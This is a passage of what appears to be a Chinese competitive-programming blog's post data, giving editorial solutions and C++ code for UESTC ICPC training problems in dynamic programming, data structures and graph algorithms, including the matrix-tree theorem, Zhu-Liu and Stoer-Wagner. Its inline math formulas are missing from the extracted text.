需要考虑化简状态. 首先, 三个机械臂的顺序不重要. 并且, 处理完 后有一个机械臂一定位于 处, 时还有一个机械臂一定位于 处, 因为刚刚处理了 的机械臂并不能被移动. 这样就压缩到了 , 已经可以直接跑了. 所以考虑状态表示 表示处理完 后, 有一个机械臂位于 , 另一个 剩下一个位于 处. 转移方式是考虑用 处的机械臂或者 处的机械臂去点 ( 刚刚用过不能再用了). 写出 dp 方程: 12345678auto dis = [&amp;](int x, int y) -&gt; int { return min(abs(x - y), m - abs(x - y));};dp[i + 1][j] = min(dp[i + 1][j], dp[i][j] + dis(a[i - 1], a[i + 1]));dp[i + 1][a[i - 1]] = min(dp[i + 1][a[i - 1]], dp[i][j] + dis(j, a[i + 1])); 其中 dis(x, y) 是 移动的距离. 处理初值: 考虑点了 后, 还有哪个机械臂没有动过. 一共有 6 种情况: 123dp[2][s1] = min(dis(s2, a[1]) + dis(s3, a[2]), dis(s2, a[2]) + dis(s3, a[1]));dp[2][s2] = min(dis(s1, a[1]) + dis(s3, a[2]), dis(s1, a[2]) + dis(s3, a[1]));dp[2][s3] = min(dis(s1, a[1]) + dis(s2, a[2]), dis(s1, a[2]) + dis(s2, a[1])); H 给一棵树，节点权值1或-1，选一个连通块使得连通块内点权值之和最大，问最大权值之和。“指挥中心”的存在对问题并不重要，但对于思考问题很有提示。 树形DP的基本套路：考虑某个子树中的答案如何转移到父亲节点中. 树根没有特殊的性质，可放心规定 1 做树根. 定义dp1[u]表示在 u 的子树中，选择 u 及其他节点的权值. 那么初值是显然的：dp1[u] = (a[u] == 1) ? 1 : -1. 从子树转移答案，过程很贪心，只需选择答案大于 0 的孩子： if (dp1[v] &gt; 0) dp1[u] += dp1[v]. 通过一次dfs完成以上转移，处理出每个节点子树方向的答案。 但每个节点的完整答案还应该包含选择父亲方向的情况。因此需要再进行一次从父亲到孩子的转移，可再利用一次DFS过程。 定义dp2[u]表示某个节点的完整答案。 从树根出发，树根没有父亲，有初值dp2[u] = dp1[u]. 树形DP从父亲转移到孩子，往往要考虑父亲有没有选择某个孩子. 如果fa没有选择u的子树，即dp1[u] &lt; 0. 直接考虑是否要合并父亲的答案. dp2[u] = max(dp1[u], dp1[u] + dp2[fa]). 如果fa选择了u的子树， 说明u位于fa的连通块中，fa的答案已经包含了u的答案，不用再重复加了. dp2[u] = max(dp1[u], dp2[fa]). I 首先考虑如何求出每个区间自身的答案. 不断两两求异或的过程非常类似与求杨辉三角中两两求和的过程, 根据杨辉三角的性质容易得到转移区间答案的方式: 1dp1[l][r] = dp1[l + 1][r] ^ dp1[l][r - 1]; 可以通过一个显然的 区间 dp 实现. 要求每个区间内答案的最大值, 再跑一趟显然的区间 dp: 1dp2[l][r] = max(max(dp2[l + 1][r], dp2[l][r - 1]), dp1[l][r]); 这样就预处理出了所有区间的答案, 直接回答即可. K 求图上两点间给定步数的路径数量, 是典型的 Floyd 传递闭包. 而 Floyd 传递闭包的本质是矩阵乘法, 所以看到巨大的 , 可以用矩阵快速幂优化. 扬子鳄的周期较短, 仅为 12, 所以 每个周期内的时刻, 12345[0] 0 -&gt; 1[1] 1 -&gt; 2[2] 2 -&gt; 3...[11] 11 -&gt; 0 12 周期内, 每个时刻可行的转移方式都可以预处理出来, 在完整邻接矩阵的基础上删除有扬子鳄的点的入边就行(出边不用删). 完整的 12 周期用矩阵快速幂处理, 剩下的余数把相应的转移矩阵乘起来即可. 题上似乎没说能不能站在原地不动, 但看样例是不行的. 所以初始的矩阵应该用零矩阵而不是单位矩阵. L 将严格单增转化为不减序列, 只需要做变换 , 那么, 所有 LIS 以外的部分都一定要被调整, 所以答案就是总长度减去 LIS 的长度. 附简洁 LIS 写法: 123456memset(lis, INF, sizeof lis);for (int i = 1; i &lt;= n; i++) { *upper_bound(lis + 1, lis + n + 1, a[i]) = a[i];}int len = 0;while (lis[len + 1] != INF) len++; upper_bound 本身返回一个指针, 所以可以直接赋值. 注意输出答案的时候开 int64. M https://oeis.org/A001250 O 多重背包模版. 直接上单调队列优化, 背包模板不妨直接贴代码. 123456789101112131415161718192021222324for (int i = 1; i &lt;= n; i++) { int64 v = read(); // 价值 int c = read(); // 重量 int m = read(); // 数量 for (int j = 0; j &lt; c; j++) { deque&lt;int64&gt; q; // 这个队列存所有最近 m 次转移的结果 deque&lt;int64&gt; qval; // 只存具有单调性的最优转移结果 // 实际上可以只用一个存下标的队列来代替两个队列 for (int k = 0; j + k * c &lt;= w; k++) { // 利用队列的长度控制物品最多选择的数量 if (q.size() &gt; m) { if (qval.front() == q.front()) { qval.pop_front(); } q.pop_front(); } int64 cur = dp[j + k * c] - k * v; // 应该排除掉随 k 变化的项 q.push_back(cur); // 总队列入队 while (!qval.empty() &amp;&amp; qval.back() &lt; cur) qval.pop_back(); qval.push_back(cur); // 单调队列入队 dp[j + k * c] = qval.front() + k * v; // 直接选取最优的物品个数转移 } }} R 好怪的树形 DP。 注意到在整个过程中，只有归零之后走到的节点的权重才对答案有影响，也就是说，从根节点到叶子节点的路径可以分为三部分，前一部分是要触发归零的，中间一部分是要统计到答案之中的，最后可能还有一部分是叶子末端不划算不走的。更进一步思考，第一部分归零之后的节点的子树都应该作为第二三部分来考虑。于是可以设计给子树设计出两种状态，dp1 表示第二三种情况，不会再归零时的答案，dp2 表示第一种情况，还可能再归零时的答案。可以设计出如下转移方式： 123dp1[u] = a[u];dp1[u] += max(dp1[v], 0);dp2[u] += max(dp1[v], dp2[v]); 由于不能保证整个过程中归零操作一定存在，答案应该取 max(dp1[1], dp2[1]) V 首先，注意到只能选择一种票，而且距离长的票可以取代距离短的票，所以扫一遍去除距离短价格高的票，然后剩下的票在距离和价格上都是单调的，可以二分答案。之后考虑如何 check，可以写出如下 DP 方程来求到终点的最小时间 1dp[i] = min(dp[j] + d[i]); // i - j &lt;= mid 则答案是从 n - d + 1 到 n 范围内最小的 dp 值。 直接枚举 j 转移显然超时，可以考虑用单调队列优化。利用单调队列维护 [i - d + 1, i] 的一段滑动窗口，队列内元素从左到右从大到小排序，超出范围的元素从左侧出队，没有当前值优秀的元素从右侧出队，然后当前值从右侧进队。每个元素最多进队一次，出队一次，可保证 的复杂度。 X 要把树上根节点出发的所有到叶子的路径长度全部填充成一样，应该全部补充到根节点出发到最远叶子节点的距离。所以先一边 DFS 处理出每个节点到最远叶子的距离：dp[u] = max(dp[v] + w)。 然后容易贪心地证明，在更靠近根节点的位置增加路径长度更优。所以，再用一遍 DFS，从根节点出发，依次将每条路径补充到孩子的最长路径长度等于全局最长，然后递归处理还没有补足长度的路径，下传已经补全的长度。 Z 零一背包模板。只需要注意到滚动数组时更新顺序很重要，从上到下枚举重量时，不会从该物品已经选取过的状态转移，所以物品只选取一次，成为零一背包；而从小到大枚举时，会从该物品已经处理过的状态转移，所以物品会选取多次，成为多重背包。","tags":["题解","oi","动态规划"],"categories":["OI"]},{"title":"2022 UESTC ICPC Training for Data Structures","path":"/2022/5/21/UESTC-ICPC-Training-Data-Structure/","content":"http://acm-uestc-edu-cn-s.vpn.uestc.edu.cn:8118/contest/171/summaryhttp://acm-uestc-edu-cn-s.vpn.uestc.edu.cn:8118/contest/171/summary A 首先对于每个物品，连续整除 d，匹配到能打开的最小钥匙。在钥匙编号从大到小排序后，可以 完成这一过程。容易理解，要使不同的钥匙使用量最小，只需要贪心地使用能打开的最小钥匙。 接下来问题转化为区间不同颜色数查询。由于 很小, 不需要使用莫队算法, 可以通过 ST 表高效解决. 通过状压的方式, 维护区间内需要的钥匙的集合 (自然地, 不存在钥匙的物品可将集合表示为空集), 这样可以用按位或合并重叠区间的答案. 输出答案时, 对状压集合进行 popcount 操作即可. 需要注意的是, __builtin_popcount 仅接受 32 位的输入, 使用 64 位整形时应使用 __builtin_popcountll. B 线段树区间加法、区间乘法模板。需要注意的就是下推和修改时要规定好两种操作的优先级, 一般是区间覆盖大于乘法, 乘法大于加法. 修改和下推时要保持一致. 修改时每次只处理一种操作, 其他的标记先下推. 最近写线段树的时候需要注意, 下推时老是忘了下推标记. C 权值线段树实现整体 Kth: 区间表示权值落在 范围内的元素数量, 然后二分查询. 具体来说, 先判断 左儿子区间元素数量, 与 k 比较, 决定下一步查询左儿子还是右儿子. (很类似平衡树的 Kth 查询过程). 修改时, 照常维护区间和就行. 实现静态区间 Kth: 考虑前缀和思想, 用 n 棵权值线段树维护 坐标区间, 查询时通过前缀和的方式, 统计区间和时需要把右端点的和减去左端点的和, 然后再决定查权值线段树上的左儿子还是右儿子. 直接开 n 棵静态线段树肯定开不下, 于是用主席树 (动态开点, 节约空间). 动态区间 Kth: 就是要动态维护前缀和, 那么可以用树状数组的方式来管理 n 棵权值线段树. 这样查询或修改的时候, 左右端点可能涉及到最多 棵权值线段树的和, 都需要进行处理. 动态开点的线段树空间消耗不小, 如果用指针分配与存储, 64 位指针比 32 位下标整数多消耗一倍空间, 还有分配的开销, 不是最优解. 使用 vector 做内存池不能解决问题, 因为 vector 每次扩张两倍空间, 扩张时复制还要消耗额外空间, 容易超内存导致奇怪的 RE. 动态开点线段树的空间消耗不好估计, 较好的方案是算好其他数组的开销, 剩下的内存都预先分配给内存池 (直接开全局数组或者 vector::reserve). D 平衡树模板，写了一个简单的 Treap。 E 可以用 CDQ 分治. 不妨反转操作的顺序, 考虑从排列中不断删点. 对答案有贡献的点对位置下标 , 除了逆序对的基本条件 且 以外, 还要满足删除时间的条件 (记 为 被删除的时刻): 转化成三维偏序问题. CDQ 分治的基本思路: 递归解决左半区间的点对 (左区间已递归排序) 递归解决右半区间的点对 (右区间已递归排序) 在左右分别有序的情况下, 讨论跨越左右区间的点对的贡献 排序整个区间 右侧对左侧, 左侧对右侧的点的贡献用树状数组维护前缀和统计. 注意每完成一轮统计后, 清空树状数组不应用全部赋值 0 的方式, 这样会超时, 应该只还原修改过的点. 详细的处理方式见代码注释. I 极端卡常的并查集模板。不做启发式，直接随机合并的并查集显然被卡掉了。按秩合并的正确并查集写法，维护每个集合的大小，每次只把小的集合合并到大的集合中，才能保证复杂度是阿克曼函数。 按秩合并有两种写法，一种是严格维护集合大小，一种是维护合并次数，二者区别不大。 1234567891011inline void unite(int a, int b) { int af = find(fa[a]); int bf = find(fa[b]); if (af == bf) return; if (rk[af] &lt; rk[bf]) { fa[af] = bf; } else { fa[bf] = fa[af]; if (rk[af] == rk[bf]) rk[af]++; }} 或者 123456789101112inline void unite(int a, int b) { int af = find(fa[a]); int bf = find(fa[b]); if (af == bf) return; if (cc[af] &gt; cc[bf]) { fa[bf] = af; cc[af] += cc[bf]; } else { fa[af] = bf; cc[bf] += cc[af]; }} 尝试过一行并查集和展开递归为循环的写法，区别不大 1234567inline int find(int u) { while (u != fa[u]) { fa[u] = fa[fa[u]]; u = fa[u]; } return u;} 卡常心得： 对于 GCC 7.3.0, inline 对产生的汇编没有任何影响。 展开递归为循环在用时上没有显著区别 由于每次只乘2，龟速模对常数影响巨大 龟速模： 1while (ans &gt;= MOD) ans -= MOD; 龟速模的汇编： 123456.L16: cmp QWORD PTR [rbp-32], 1000000006 jle .L15 sub QWORD PTR [rbp-32], 1000000007 jmp .L16.L15: 而普通模 ans %= MOD 会没有直接的硬件实现，会产生大量指令： 123456789101112131415mov rcx, QWORD PTR [rbp-32]movabs rdx, -8543223828751151131mov rax, rcximul rdxlea rax, [rdx+rcx]sar rax, 29mov rdx, raxmov rax, rcxsar rax, 63sub rdx, raxmov rax, rdximul rax, rax, 1000000007sub rcx, raxmov rax, rcxmov QWORD PTR [rbp-32], rax J STL 数据结构也叫数据结构 思想就是商品价格从大到小枚举，每个商品贪心匹配能用的最小的纸币，找不到则消耗一次修改次数。最后还有剩余的修改次数，则把已有的匹配中差值最大的改成 0. 匹配纸币的过程利用 multiset 的 lower_bound 实现，匹配到纸币后顺手把差值丢进 priority_queue 方便求最大 k 个。注意如果没有匹配合适的纸币，需要花费修改次数时，不能按照题解说的，随便取一张纸币拿出集合，因为不能确定随便一张纸币以后还会不会用到。但是可以不做出队操作，自然最后剩下的纸币就是要修改的，也不用处理了。 K 线段树套线段树。外层线段树维护列，叶子节点对应一整行的内层线段树，非叶子节点对应行的范围。内层线段树维护每行上区间的信息。 查询时，先处理外层列范围，外层节点需要分割区间时，和普通线段树一样递归查询，不分割区间时，调用节点上的内层线段树查询行范围。内层线段树就是普通的一维线段树查询。 修改时，利用搜索回溯，先更新叶子节点上的行线段树，非叶子节点的内层数更新叶子节点时，利用外层树上节点的孩子更新叶子的值，然后照常上推。 查询和修改操作都是 的复杂度。 理论上也有可能写四分树来实现，但树套树更常见，并且更有推广练习的价值。 L 先写个 的普通莫队，用 map 离散化，set 维护区间内出现次数，同时维护次数最大值。很不幸，复杂度不对，常数卡的紧，没法再承受一个 了。 众数问题，增加元素容易，删除元素难，考虑回滚莫队。将区间以左端点分块为第一关键字，右端点为第二关键字排序，暴力回答左右端点同一分块的区间，最多；左端点同一分块的区间中的处理中，可以保证右端点单调增加，而左端点的处理，可以缓存住左端点位于分块右边界侧的答案，每次查询都重新从分块右边界向左推进边界，记录当前查询，然后将左端点和答案重置到缓存的分块右边界上，左端点推进次，右端点无需删除，不影响总复杂度。 需要注意的是，暴力回答的查询与莫队过程无关，应该用单独的计数数组统计答案，不能和莫队过程公用。 M 树上莫队模版. 使用莫队算法容易解决一维情况的区间颜色计数问题, 可以通过求树的欧拉序, 将树上的路径转化为一维序列. 例如样例中的树, 求出它的一种欧拉序 11 4 8 8 4 2 2 3 7 7 6 6 5 5 3 1 记进入每个节点时欧拉序中的下标是 enter[u], 离开时是 leave[u], 不妨设 enter[u] &lt; enter[v] 则发现: v 在 u 的子树中, 欧拉序中从 enter[u] 到 enter[u] 的区间内, 只出现一次的点对应 u 到 v 的路径 v 不在 u 的子树中, 即 lca(u, v) != u 时, 欧拉序中 leave[u] 到 enter[v] 的区间以及 lca(u, v) 单点对应 u 到 v 的路径 可以用额外一个数组来处理 “只出现一次” 的条件, 于是利用欧拉序, 树上的路径查询变为一维区间查询, 可用莫队解决. 欧拉序的长度是 , 但可以证明, 莫队分块大小取 时效果最好. LCA 查询可以用很多方法, 倍增, 离线, 树剖, 已经求出欧拉序了还能用 ST 表, 总的来说树剖常数小一点, 快一点. Q 先考虑解决一维区间上的颜色段计数问题. 可以用线段树维护, 每个区间维护左端和右端的颜色, 以及区间内颜色段的数量. 合并区间答案时, 颜色段数量直接求和, 若左区间右端点和右区间左端点的颜色相同, 则应当合并为同一段, 区间答案减一. 转化到树链剖分上, 注意到此问题的区间合并要求区间具有方向性, 需要小心处理. 树剖的区间合并是可以具有方向性的, 利用每一条重链上对应的线段树区间, 从左到右深度从浅到深. 以此维护合并时区间的方向, 在恰当的时机交换左右端点的颜色, 小心处理树剖查询中交换 x 和 y 的写法, 可以实现保持方向性的树上路径合并. Z Splay 模板，维护可分裂合并的序列。Splay 好用的关键在于无论什么操作都要把目标节点 splay 到根节点，才能保证均摊复杂度，不要忘了 splay 了。 另外是 splay 有维护父亲指针的写法和不维护父亲指针的写法, 个人觉得不维护父亲的写法方便一点.","tags":["题解","oi","数据结构"],"categories":["OI"]},{"title":"2022 UESTC ICPC Training for Graph","path":"/2022/4/30/UESTC-ICPC-Training-Graph/","content":"http://acm-uestc-edu-cn-s.vpn.uestc.edu.cn:8118/contest/170/summaryhttp://acm-uestc-edu-cn-s.vpn.uestc.edu.cn:8118/contest/170/summary A POJ2914 Lutece 2710 Minimum Cut C 容易证明只有行号列号之和奇偶性相同的情况下才能到达重点. 并且这种情况下, 能走通的对角线方向都是与奇偶性相关的. 因此直接按照初始方向与能走通的方向是否相同确定权值建图即可. E 在题目要求简单路径的情况下, 容易发现如果起点和查询点都在同一个点双联通分量下, 则一定可以构造出一条路径经过点双联通分量中的最小点. 所以利用 Tarjan 算法求出割点, 然后缩点成一棵树的情况, 此时只有一条可行路径, 直接 DFS 可处理出所有点的答案. 缩点方法: 每个点双联通分量除了割点外所有点缩成一点, 然后每个割点与所在的多个点双联通分量连边. 坑点: 如果查询起点, 则结果就是起点的权值, 而不能去查询起点所在的点双. 起点是割点并不影响. J 几乎是无向图上 Tarjan 算法模版了. 注意两割点之间连边也算点双的要求其实并不需要特殊处理. 需要处理的是此题并不认为孤立的点算作点双. K LCA 模版, 可以写倍增, 可以写 Tarjan 离线, 甚至可以写树剖, 也可以写 LCT. 要说倍增写法有什么坑点的话, 恐怕就是记得改了 MAXN 后, 记得对应修改 log 次数, 别没开够. I 2-SAT 模版. 将 u == x || v == y 转化成 u == !x =&gt; v == y 和 v == !y =&gt; u == y, 每个条件对应一个节点, 连有向边, 判断对于每个值 x, x == 1 和 x == 0 是否在同一个强连通分类中, 如果是则不存在方案. J 洛谷 P4208 Lutece 2726 最小生成树计数模版 K Dijkstra 模版. 记得开 int64, 记得优先队列用 greater, 没了. Q 将边权的贡献分成两部分, 和 , 然后发现可以用类似归并排序的过程去贪心连边, 总共要连 条边, 再随便跑个生成树就好了. R 洛谷 P4716 Lutece 2733 POJ3164 最小树形图模板 S 二分图匹配模版. 匈牙利算法随便跑跑, 不大的稠密图用邻接矩阵存图会更方便. T 其实可以不管二分图, 直接用网络流来考虑. 假设初始情况是每个点都是一条独立的链, 则问题相当于是问能进行多少次链的合并操作, 沿着 DAG 上的边将链合并起来, 则最小链数就是节点数减合并次数. 于是把每个点拆成入点和出点, 源和入点, 出点和汇连容量为一的边 (每个点的入度和出度最多用一次), 然后 DAG 上的边就把起点的入点和终点的出点连起来即可, 然后求最大流, Dinic 足矣.","tags":["题解","oi","图论"],"categories":["OI"]},{"title":"洛谷 P4208 Lutece 2726 最小生成树计数模版","path":"/2022/4/22/Luogu-P4208/","content":"https://www.luogu.com.cn/problem/P4208https://www.luogu.com.cn/problem/P4208 题意 求 个节点, 条边的无向图的不同的最小生成树个数. 问题本身的性质 多尝试几个样例可以发现, 同一个图的所有最小生成树中, 相同边权的边的数量是一定相等的. 通过 Kruscal 算法的贪心过程容易证明这个结论: 从权值最小的边开始选择, 假如一种方案选择了 条权值为 的边, 若另一种方案选了比 更多的 边, 则说明原来的方案不是最优解; 若选了更少的 边, 则新方案不是最优解. 因此, 满足最小的条件下, 生成树中相同权值的边数量相同. 借助以上性质, 可以先求出一棵最小生成树, 然后分别考虑生成树上不同权值的边的答案, 通过乘法原理得到结果. 然而, 直接用组合数计算是不行的, 因为任选 条权值为 的边, 不能保证仍然能够与其他权值的边组合成生成树. 通过矩阵树定理, 可以利用行列式计算图的所有生成树个数. 为了固定其余边权的边不变, 只考虑选取某个边权的边的情况, 可以通过并查集的方式将原有生成树上其他权值的边都缩成一点, 只保留要求权值的边, 则缩点后图的生成树数量就是满足条件的原图生成树数量. 矩阵树定理 定义图的 Laplacian 矩阵 , 其中 是节点 i 的度数, 是节点 u 和 v 的边数. image.png 例如, 上图的 Laplacian 矩阵是 则图的生成树个数为 , 其中 是 去掉 行 列, 任取 . 详细的证明可参考 知乎文章. 行列式 显然不能用循环群定义和余子式定义直接求. 考虑高斯消元转换为上三角阵. 由于本题中模数不一定是质数, 不能直接进行除法 (疑似浮点数的精度可以通过此题), 但可以考虑用辗转相除法进行消元, 规避除法运算. 辗转相除法本身不会造成太高的复杂度, 仍可以视作 级别. 123456789101112131415161718192021222324252627template &lt;typename T&gt;T det(vector&lt;vector&lt;T&gt;&gt; a, T mod, int n = -1) { T symbol = 1; if (n == -1) n = a.size(); for (int i = 0; i &lt; n; i++) { for (int j = i + 1; j &lt; n; j++) { while (a[i][i] != 0) { T d = a[j][i] / a[i][i] % mod; for (int k = i; k &lt; n; k++) { a[j][k] -= a[i][k] * d % mod; a[j][k] = (a[j][k] % mod + mod) % mod; } swap(a[i], a[j]); symbol = -symbol; } swap(a[i], a[j]); symbol = -symbol; } } T ans = symbol; for (int i = 0; i &lt; n; i++) { ans *= a[i][i]; ans %= mod; } return (ans + mod) % mod;} 代码 Kruscal 最小生成树已经将边排序过了, 枚举相同权值的边比较方便. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283class kruskal { struct edge { int to, from; int w; edge(int to = 0, int from = 0, int w = 0) : to(to), from(from), w(w) {} } e[MAXM * 2]; int ecnt; int n; int fa[MAXN]; int color[MAXN]; int find(int u) { return (fa[u] == u) ? u : fa[u] = find(fa[u]); } static bool cmp(const edge&amp; a, const edge&amp; b) { return a.w &lt; b.w; } public: kruskal(int n) { this-&gt;n = n; ecnt = 0; } void adde(int to, int from, int w) { e[++ecnt] = edge(to, from, w); } int64 solve_count() { sort(e + 1, e + ecnt + 1, cmp); for (int i = 1; i &lt;= n; i++) { fa[i] = i; } int pos = 1; int max_weight = 0; vector&lt;edge&gt; tree_edges; tree_edges.reserve(n - 1); while (tree_edges.size() &lt; n - 1 &amp;&amp; pos &lt;= ecnt) { edge&amp; now = e[pos]; pos++; if (find(now.from) != find(now.to)) { max_weight = now.w; tree_edges.push_back(now); fa[find(now.from)] = find(now.to); } } if (tree_edges.size() &lt; n - 1) return 0; int64 ans = 1; int cur_edge = 1; while (cur_edge &lt;= ecnt &amp;&amp; e[cur_edge].w &lt;= max_weight) { int cur_weight = e[cur_edge].w; for (int i = 1; i &lt;= n; i++) { fa[i] = i; } for (auto&amp; e : tree_edges) { if (e.w != cur_weight) { fa[find(e.from)] = find(e.to); } } int color_cnt = 0; memset(color, -1, sizeof color); for (int i = 1; i &lt;= n; i++) { if (color[find(i)] == -1) { color[find(i)] = color_cnt; color_cnt++; } color[i] = color[find(i)]; } vector&lt;vector&lt;int64&gt;&gt; laplacian(color_cnt, vector&lt;int64&gt;(color_cnt, 0)); while (e[cur_edge].w == cur_weight &amp;&amp; cur_edge &lt;= ecnt) { int u = color[e[cur_edge].from]; int v = color[e[cur_edge].to]; laplacian[u][v] -= 1; laplacian[v][u] -= 1; laplacian[u][u] += 1; laplacian[v][v] += 1; cur_edge++; } ans *= det&lt;int64&gt;(laplacian, MOD, color_cnt - 1); ans %= MOD; } return ans; }};","tags":["题解","oi","图论"],"categories":["OI"]},{"title":"洛谷 P4716 Lutece 2733 POJ3164 最小树形图模板","path":"/2022/4/19/Luogu-P4716/","content":"https://www.luogu.com.cn/problem/P4716https://www.luogu.com.cn/problem/P4716 题意 最小树形图是有向图上，从给定的根节点出发到达所有节点的一颗生成树。 分析 求解最小树形图的一种算法是的朱刘算法。 考虑给除根节点外的每个点寻找一条最小的入边，如果找出的入边恰好构成一棵树，则容易证明这样的情况1是最优解。如果找不出入边，说明最小树形图不存在。 对于找出的入边构成环的情况，朱刘算法提出可以通过不断地将环缩成点来处理。枚举最小入边的过程保证每个环上只需要断开一条边，而且断开处的节点可能需要寻找一条环外的入边。所以可以先将环上所有边的边权都统计到答案中，然后对于环上每个点，将环外的入边都减去环上入边的边权，这样缩环为点以后，再选择到被处理过边权的入边时，就相当于确定了断开环的位置。之后，再重复枚举最小入边和缩环的过程，直到没有环为止。 使用邻接矩阵存图时，缩环的具体操作，先选定环上的任意一个点，然后将环外连接其他点的边连接到该点上，重复的边权直接取最小，出边类似处理。之后，用一个数组给环上的其他点打上标记，之后的过程中不再枚举即可。 朱刘算法可清晰地划分为如下流程： 枚举所有点的入边 判断入边是否存在环 不存在环，算法结束，返回答案 找到一个环（有且仅有一个） 统计环上边权之和 所有环外入边的边权，减去环上入边的边权 将环上其余点的边转移到代表点上 给其余点打上删除标记 重复步骤 1 代码 洛谷的数据似乎强度很低，找环过程有明显错误的代码都能通过。 下面给出 Lutece 2733 的代码，与洛谷代码仅有数据范围的区别。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111int g[MAXN][MAXN];bool remove_tag[MAXN]; // 缩环时删点标记int fa[MAXN]; // 每轮，每个点的最小前驱节点bool vis[MAXN]; // 找环的标记int directional_spawning_tree(int root, int n) { int ans = 0; memset(remove_tag, false, sizeof remove_tag); while (true) { // 找每个点的最小前驱边 for (int u = 1; u &lt;= n; u++) { if (remove_tag[u] || u == root) continue; int min_val = INF; int min_node = 0; for (int i = 1; i &lt;= n; i++) { if (remove_tag[i]) continue; if (g[i][u] &lt; min_val) { min_val = g[i][u]; min_node = i; } } // 如果没有前驱，则无解 if (min_node == 0) return -1; fa[u] = min_node; } // 判断是否有环 bool has_loop = false; int loop_head = 0; for (int i = 1; i &lt;= n; i++) { if (remove_tag[i] || i == root) continue; memset(vis, false, sizeof vis); vis[root] = true; int u = i; while (!vis[u]) { vis[u] = true; u = fa[u]; } if (u != root) { has_loop = true; loop_head = u; break; } } if (!has_loop) { // 没有环，则算法结束 for (int i = 1; i &lt;= n; i++) { if (remove_tag[i] || i == root) continue; ans += g[fa[i]][i]; } return ans; } // cout &lt;&lt; loop_head &lt;&lt; endl; // 进行缩环操作 // 统计环上的权值 int u = loop_head; do { ans += g[fa[u]][u]; u = fa[u]; } while (u != loop_head); // 然后处理环上所有入边的权值，入边权值减去环上边的权值 // 这样缩环后再判断找最小前驱边时，选到入环的边就决定了断环的位置 u = loop_head; do { for (int i = 1; i &lt;= n; i++) { if (remove_tag[i]) continue; if (i != fa[u] &amp;&amp; g[i][u] != INF) { g[i][u] -= g[fa[u]][u]; } } u = fa[u]; } while (u != loop_head); // 缩点，转移权值 for (int i = 1; i &lt;= n; i++) { if (remove_tag[i] || i == loop_head) continue; int u = fa[loop_head]; do { g[loop_head][i] = min(g[loop_head][i], g[u][i]); g[i][loop_head] = min(g[i][loop_head], g[i][u]); u = fa[u]; } while (u != loop_head); } // 把环上其他的点都标记删除 u = fa[loop_head]; do { remove_tag[u] = true; u = fa[u]; } while (u != loop_head); }}int main() { int n = read(); int m = read(); int r = read(); memset(g, INF, sizeof g); for (int i = 1; i &lt;= m; i++) { int u = read(); int v = read(); int w = read(); g[u][v] = min(g[u][v], w); } int res = directional_spawning_tree(r, n); write(res);} 其实随机生成的图几乎都符合这样的条件。↩︎","tags":["题解","oi","图论"],"categories":["OI"]},{"title":"POJ2914 Lutece 2710 Minimum Cut","path":"/2022/4/13/POJ-2914/","content":"http://poj.org/problem?id=2914http://poj.org/problem?id=2914 题意 个点 条边（最多完全图）的带权无向图，问至少删去的边权之和，使删边后图不连通。（任意两点的最小割）。 分析 显然枚举两点用最大流最小割来求跑不过。介绍此类问题的模板做法：Stoer-Wagner 算法，主要思想是枚举寻找任意两点的最小割，每处理两点之后进行“缩点”操作，可保证 复杂度。 考虑 的最小割把 分割为两侧，则枚举两点 一定属于一下两种情况： 不在同一侧，那么枚举到 时就能求出答案。 在同一侧，那么可以进行缩点操作，把 合并成一个点，不会影响答案。 只需要给定起点时能够 求出最小割，然后不断删掉（合并）一个点再进行 的枚举，最终可达到 的复杂度。 由于具有缩点的特性，可以考虑类似 Prim 的做法，不断向一个点集中加点，这个点集对应最终最小割方案的一侧，而最小割另一侧已经通过缩点过程被缩成了一个点，于是只需要用 w[i] 数组来维护每个点集外的点到点集的直接连边边权之和。不断地选取当前 w[i] 最大的点加入点集中，最终选取的点的 w[v] 值就对应一种合法、并且最优的‘单点’最小割方案。 此时即可统计答案，然后缩点，再进行下一次类 Prim 枚举。缩点时应该考虑将最终剩下的 （一定要合并 ，下一次从头枚举才是有意义的，否则找到的最终点还是 ）和上一次添加进点集的点 进行合并，容易贪心证明此种合并方式的最优性。 为了合并操作的方便，使用邻接矩阵存图，可以用下面的 for 循环完成缩点： 12345for (int i = 1; i &lt;= remain; i++) { if (i == u || i == v) continue; g[i][u] += g[i][v]; g[u][i] += g[v][i];} 然后只需删除 ，使得之后不再枚举它。下文代码中利用 fa 数组删除 是一种巧妙的实现方式。 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758int g[MAXN][MAXN];int w[MAXN]; // w[i] 已选定集合中所有点到 i 的直接连边边权总和int fa[MAXN]; // 处理合并操作后，删掉其中一个点bool ins[MAXN];int main() { int n, m; while (cin &gt;&gt; n &gt;&gt; m) { memset(g, 0, sizeof g); for (int i = 1; i &lt;= m; i++) { int u = read(); int v = read(); int c = read(); g[u][v] += c; g[v][u] += c; } for (int i = 0; i &lt; n; i++) { fa[i] = i; } int ans = INF; int remain = n; while (remain &gt; 1) { memset(w, 0, sizeof w); memset(ins, false, sizeof ins); ins[0] = true; int u = 0; int v = 0; for (int i = 1; i &lt; remain; i++) { u = v; v = -1; int cut_v = -1; for (int j = 1; j &lt; remain; j++) { if (!ins[j]) { w[j] += g[fa[j]][fa[u]]; if (w[j] &gt; cut_v) { cut_v = w[j]; v = j; } } } ins[v] = true; } ans = min(ans, w[v]); // 类似并查集的合并操作 for (int i = 1; i &lt; remain; i++) { if (i == v) continue; g[fa[i]][fa[0]] += g[fa[i]][fa[v]]; g[fa[0]][fa[i]] += g[fa[v]][fa[i]]; } remain--; fa[v] = fa[remain]; // 相当于是把 v 删掉了 } write(ans); putchar(' '); }} Lutece 2710 是双倍经验。","tags":["题解","oi","图论"],"categories":["OI"]},{"title":"电子科技大学第十二届ACM趣味程序设计竞赛第一场（热身赛）","path":"/2021/11/20/UESTC-Contest-1/","content":"https://acm.uestc.edu.cn/contest/151/summaryhttps://acm.uestc.edu.cn/contest/151/summary A. 双十一 每种货物从最便宜的商店买即可。注意不要把 n 和 m 看反了。 12345678910111213141516171819202122232425int prices[MAXN][MAXN];int main() { int n = read(); int m = read(); for (int i = 1; i &lt;= m; i++) { for (int j = 1; j &lt;= n; j++) { prices[i][j] = read(); if (prices[i][j] == -1) { prices[i][j] = INF; } } } int ans = 0; for (int j = 1; j &lt;= n; j++) { int cur = INF; for (int i = 1; i &lt;= m; i++) { cur = min(cur, prices[i][j]); } ans += cur; } write(ans); putchar(' ');} B. 我们身边的狼 向每一个人询问所有人的状态，则平民的回答都会相同，狼的回答都会相同， 